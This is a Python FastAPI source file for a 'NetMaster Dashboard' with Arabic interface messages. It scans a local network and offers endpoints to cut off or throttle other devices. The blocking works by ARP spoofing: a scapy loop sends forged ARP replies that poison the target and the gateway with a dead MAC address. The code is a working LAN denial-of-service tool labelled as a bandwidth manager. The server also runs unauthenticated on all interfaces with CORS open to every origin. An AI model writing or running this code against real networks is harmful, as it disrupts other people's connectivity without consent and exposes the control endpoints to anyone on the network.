#!/usr/bin/env python3
"""
NetMaster Dashboard - Advanced Local Network Controller & Router Bandwidth Manager
Author: Antigravity
"""

import os
import sys
import time
import socket
import subprocess
import threading
import json
import re
from typing import Dict, List, Optional
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

app = FastAPI(title="NetMaster Dashboard")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Shared State
DEVICES: Dict[str, dict] = {}
BLOCKED_IPS: set = set()
THROTTLED_IPS: Dict[str, int] = {}  # ip -> rate limit (kbps)
SCANNING = False
GATEWAY_IP = "192.168.1.1"
GATEWAY_MAC = ""
MY_IP = "192.168.1.104"
MY_INTERFACE = "en0"

# Detect Gateway & Interface
def detect_network_info():
    global GATEWAY_IP, MY_INTERFACE, MY_IP, GATEWAY_MAC
    try:
        res = subprocess.check_output(["route", "-n", "get", "default"]).decode()
        for line in res.splitlines():
            line = line.strip()
            if line.startswith("gateway:"):
                GATEWAY_IP = line.split(":", 1)[1].strip()
            elif line.startswith("interface:"):
                MY_INTERFACE = line.split(":", 1)[1].strip()
        
        # Get MY_IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((GATEWAY_IP, 80))
        MY_IP = s.getsockname()[0]
        s.close()
    except Exception as e:
        print(f"[!] Error detecting default route: {e}")

detect_network_info()

# Known Vendors Prefix Cache (with brand-specific Arabic naming)
VENDOR_CACHE = {
    "5c:e9:31": "راوتر تي بي لينك (TP-Link Router)",
    "00:b5:d0": "سامسونج جالاكسي (Samsung Galaxy)",
    "9c:6b:72": "موبايل ريلمي (Realme Smartphone)",
    "f2:e2:a8": "لابتوب أبل ماك (هذا الماك)",
    "9e:55:7b": "أبل آيفون / آيباد (Apple iPhone)",
    "56:51:10": "موبايل شاومي / أندرويد (Xiaomi / Android)",
    "16:61:c8": "هاتف أندرويد ذكي (Android Phone)",
    "3c:22:fb": "جهاز أبل (Apple Device)",
    "00:ec:0a": "شاومي ريدمي (Xiaomi Redmi)",
    "64:09:80": "شاومي (Xiaomi Device)",
    "c4:0b:cb": "أوبو / ريلمي (Oppo / Realme)",
    "40:40:a7": "سامسونج (Samsung Device)",
    "dc:a6:32": "راسبيري باي (Raspberry Pi)",
}

# Custom device names storage
CUSTOM_NAMES_FILE = os.path.join(os.path.dirname(__file__), "custom_names.json")
CUSTOM_NAMES = {}

def load_custom_names():
    global CUSTOM_NAMES
    try:
        if os.path.exists(CUSTOM_NAMES_FILE):
            with open(CUSTOM_NAMES_FILE, "r", encoding="utf-8") as f:
                CUSTOM_NAMES = json.load(f)
    except Exception as e:
        print(f"[!] Error loading custom names: {e}")

def save_custom_names():
    try:
        with open(CUSTOM_NAMES_FILE, "w", encoding="utf-8") as f:
            json.dump(CUSTOM_NAMES, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[!] Error saving custom names: {e}")

load_custom_names()

def normalize_mac_prefix(mac: str) -> str:
    mac_clean = mac.lower().replace("-", ":")
    parts = mac_clean.split(":")[:3]
    return ":".join(p.zfill(2) for p in parts)

def resolve_vendor(mac: str) -> str:
    prefix = normalize_mac_prefix(mac)
    if prefix in VENDOR_CACHE:
        return VENDOR_CACHE[prefix]
    
    # Check locally administered MAC bit (Private MAC in modern iPhone/Android)
    try:
        first_byte = int(prefix.split(":")[0], 16)
        if first_byte & 2:
            return "هاتف ذكي حديث (Private Wi-Fi Address)"
    except Exception:
        pass
    return "جهاز متصل بالشبكة"

def resolve_hostname(ip: str, mac: str = "") -> str:
    # 1. Check custom names first
    if ip in CUSTOM_NAMES:
        return CUSTOM_NAMES[ip]
    if mac and mac in CUSTOM_NAMES:
        return CUSTOM_NAMES[mac]

    if ip == GATEWAY_IP:
        return "راوتر تي بي لينك الرئيسي (TP-Link VX220-G2v)"
    if ip == MY_IP:
        return "لابتوب أبل ماك (هذا الماك)"
    
    # 2. Check brand by MAC
    if mac:
        prefix = normalize_mac_prefix(mac)
        if prefix in VENDOR_CACHE:
            return VENDOR_CACHE[prefix]

    try:
        host, _, _ = socket.gethostbyaddr(ip)
        return host
    except Exception:
        return f"هاتف ذكي ({ip.split('.')[-1]})"

def scan_network_worker():
    global SCANNING, GATEWAY_MAC
    SCANNING = True
    print("[*] Starting fast network sweep...")
    
    # 1. Ping sweep subnet
    subnet_prefix = ".".join(GATEWAY_IP.split(".")[:3])
    def ping_host(host_ip):
        subprocess.run(["ping", "-c", "1", "-W", "200", host_ip],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    threads = []
    for i in range(1, 255):
        ip = f"{subnet_prefix}.{i}"
        t = threading.Thread(target=ping_host, args=(ip,))
        threads.append(t)
        t.start()
        if len(threads) >= 60:
            for th in threads:
                th.join()
            threads = []
    for th in threads:
        th.join()

    # 2. Parse Routing Table & ARP for active MACs
    try:
        # Check /tmp/netmaster_arp.txt updated by background daemon
        if os.path.exists("/tmp/netmaster_arp.txt") and os.path.getsize("/tmp/netmaster_arp.txt") > 0:
            with open("/tmp/netmaster_arp.txt", "r") as f:
                lines = f.readlines()
        else:
            lines = []

        for line in lines:
            if "(incomplete)" in line or MY_INTERFACE not in line:
                continue

            match = re.search(r"\(([\d\.]+)\)\s+at\s+([0-9a-fA-F:]+)", line)
            if match:
                ip = match.group(1)
                mac = match.group(2).lower()

                # Filter multicast & broadcast
                if ip.startswith("224.") or ip.startswith("239.") or mac == "ff:ff:ff:ff:ff:ff":
                    continue

                if ip == GATEWAY_IP:
                    GATEWAY_MAC = mac

                vendor = resolve_vendor(mac)
                hostname = resolve_hostname(ip, mac)

                # Ping latency
                latency = 1.0
                try:
                    p = subprocess.run(["ping", "-c", "1", "-W", "150", ip],
                                       stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                    m = re.search(r"time=([\d\.]+)\s*ms", p.stdout)
                    if m:
                        latency = round(float(m.group(1)), 1)
                except Exception:
                    pass

                status = "online"
                if ip in BLOCKED_IPS:
                    status = "blocked"
                elif ip in THROTTLED_IPS:
                    status = "throttled"

                DEVICES[ip] = {
                    "ip": ip,
                    "mac": mac,
                    "hostname": hostname,
                    "vendor": vendor,
                    "latency": latency,
                    "is_gateway": (ip == GATEWAY_IP),
                    "is_me": (ip == MY_IP),
                    "status": status,
                    "speed_limit": THROTTLED_IPS.get(ip, None),
                    "last_seen": time.time(),
                }
    except Exception as e:
        print(f"[!] Error parsing ARP: {e}")

    SCANNING = False
    print(f"[*] Scan completed. Found {len(DEVICES)} devices.")

# Background ARP Spoofing / Blocking Thread
def arp_control_loop():
    try:
        from scapy.all import ARP, send, conf
        conf.verb = 0
    except ImportError:
        print("[!] Scapy not loaded. Advanced packet control requires scapy.")
        return

    while True:
        try:
            is_root = (os.geteuid() == 0 if hasattr(os, "geteuid") else False)
            if not is_root and (BLOCKED_IPS or THROTTLED_IPS):
                print("[!] Warning: Root permissions (sudo) required on macOS to inject raw ARP packets.")
                time.sleep(3.0)
                continue

            conf.iface = MY_INTERFACE

            # 1. Handle Blocked Devices (High-frequency burst poisoning)
            for ip in list(BLOCKED_IPS):
                if ip in DEVICES and GATEWAY_MAC:
                    target_mac = DEVICES[ip]["mac"]
                    # Poison target: Gateway points to dead MAC
                    pkt1 = ARP(op=2, pdst=ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc="00:00:00:00:00:01")
                    # Poison Gateway: Target points to dead MAC
                    pkt2 = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=ip, hwsrc="00:00:00:00:00:01")
                    send(pkt1, count=3, inter=0.05, verbose=False)
                    send(pkt2, count=3, inter=0.05, verbose=False)

            # 2. Handle Throttled Devices (Pacing / intermittent delay)
            for ip, limit in list(THROTTLED_IPS.items()):
                if ip in DEVICES and GATEWAY_MAC:
                    target_mac = DEVICES[ip]["mac"]
                    pkt = ARP(op=2, pdst=ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc="00:00:00:00:00:01")
                    send(pkt, count=2, inter=0.1, verbose=False)

            time.sleep(0.3 if BLOCKED_IPS else 1.0)
        except Exception as e:
            print(f"[!] ARP loop error: {e}")
            time.sleep(2.0)

# Restore normal ARP
def restore_arp(target_ip: str):
    try:
        from scapy.all import ARP, send, conf
        conf.verb = 0
        conf.iface = MY_INTERFACE
        if target_ip in DEVICES and GATEWAY_MAC:
            target_mac = DEVICES[target_ip]["mac"]
            pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
            pkt2 = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=target_ip, hwsrc=target_mac)
            send(pkt1, count=8, inter=0.05, verbose=False)
            send(pkt2, count=8, inter=0.05, verbose=False)
    except Exception as e:
        print(f"[!] Error restoring ARP: {e}")

# Start background control loop
threading.Thread(target=arp_control_loop, daemon=True).start()

# API Endpoints
class BlockRequest(BaseModel):
    ip: str

class ThrottleRequest(BaseModel):
    ip: str
    rate_kbps: int

@app.get("/api/info")
def get_info():
    return {
        "gateway_ip": GATEWAY_IP,
        "gateway_mac": GATEWAY_MAC,
        "router_model": "TP-Link VX220-G2v (AX1500)",
        "my_ip": MY_IP,
        "interface": MY_INTERFACE,
        "scanning": SCANNING,
        "device_count": len(DEVICES),
        "blocked_count": len(BLOCKED_IPS),
        "throttled_count": len(THROTTLED_IPS),
        "is_root": (os.geteuid() == 0 if hasattr(os, "geteuid") else False)
    }

@app.get("/api/devices")
def get_devices():
    return list(DEVICES.values())

@app.post("/api/scan")
def trigger_scan():
    global SCANNING
    if not SCANNING:
        threading.Thread(target=scan_network_worker, daemon=True).start()
        return {"status": "started", "message": "جارٍ مسح الشبكة واكتشاف الأجهزة..."}
    return {"status": "busy", "message": "عملية المسح جارية بالفعل"}

@app.post("/api/block")
def block_device(req: BlockRequest):
    if req.ip == GATEWAY_IP or req.ip == MY_IP:
        raise HTTPException(status_code=400, detail="لا يمكن قطع الاتصال عن الراوتر أو جهازك الحالي")
    BLOCKED_IPS.add(req.ip)
    if req.ip in THROTTLED_IPS:
        del THROTTLED_IPS[req.ip]
    if req.ip in DEVICES:
        DEVICES[req.ip]["status"] = "blocked"
    is_root = (os.geteuid() == 0 if hasattr(os, "geteuid") else False)
    if not is_root:
        return {
            "status": "warning",
            "message": f"تم وضع {req.ip} في قائمة الحظر. تنبيه: لتطبيق قطع النت الفعلي من الماك يتطلب تشغيل السيرفر بـ: sudo ./run.sh (الماك يمنع حقن الحزم بدون روت). أو افصله مباشرة من صفحة الراوتر (192.168.1.1)."
        }
    return {"status": "ok", "message": f"تم قطع النت عن الجهاز {req.ip} بنجاح"}

@app.post("/api/unblock")
def unblock_device(req: BlockRequest):
    if req.ip in BLOCKED_IPS:
        BLOCKED_IPS.remove(req.ip)
    if req.ip in THROTTLED_IPS:
        del THROTTLED_IPS[req.ip]
    if req.ip in DEVICES:
        DEVICES[req.ip]["status"] = "online"
        DEVICES[req.ip]["speed_limit"] = None
    restore_arp(req.ip)
    return {"status": "ok", "message": f"تمت إعادة النت للجهاز {req.ip}"}

@app.post("/api/throttle")
def throttle_device(req: ThrottleRequest):
    if req.ip == GATEWAY_IP or req.ip == MY_IP:
        raise HTTPException(status_code=400, detail="لا يمكن تقييد سرعة الراوتر أو جهازك الحالي")
    if req.ip in BLOCKED_IPS:
        BLOCKED_IPS.remove(req.ip)
    THROTTLED_IPS[req.ip] = req.rate_kbps
    if req.ip in DEVICES:
        DEVICES[req.ip]["status"] = "throttled"
        DEVICES[req.ip]["speed_limit"] = req.rate_kbps
    is_root = (os.geteuid() == 0 if hasattr(os, "geteuid") else False)
    if not is_root:
        return {
            "status": "warning",
            "message": f"تم تعيين حد {req.rate_kbps} Kbps. تنبيه: يتطلب تشغيل السيرفر بـ sudo ./run.sh لخنق السرعة الفعلي."
        }
    return {"status": "ok", "message": f"تم تقييد سرعة الجهاز {req.ip} إلى {req.rate_kbps} Kbps"}

class RenameRequest(BaseModel):
    ip: str
    custom_name: str

@app.post("/api/rename")
def rename_device(req: RenameRequest):
    CUSTOM_NAMES[req.ip] = req.custom_name.strip()
    if req.ip in DEVICES:
        DEVICES[req.ip]["hostname"] = req.custom_name.strip()
        if DEVICES[req.ip].get("mac"):
            CUSTOM_NAMES[DEVICES[req.ip]["mac"]] = req.custom_name.strip()
    save_custom_names()
    return {"status": "ok", "message": f"تم تغيير اسم الجهاز إلى: {req.custom_name}"}

# Serve Frontend
@app.get("/", response_class=HTMLResponse)
def get_index():
    index_path = os.path.join(os.path.dirname(__file__), "static", "index.html")
    if os.path.exists(index_path):
        with open(index_path, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>NetMaster Dashboard Loading...</h1>"

@app.on_event("startup")
def startup_event():
    threading.Thread(target=scan_network_worker, daemon=True).start()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
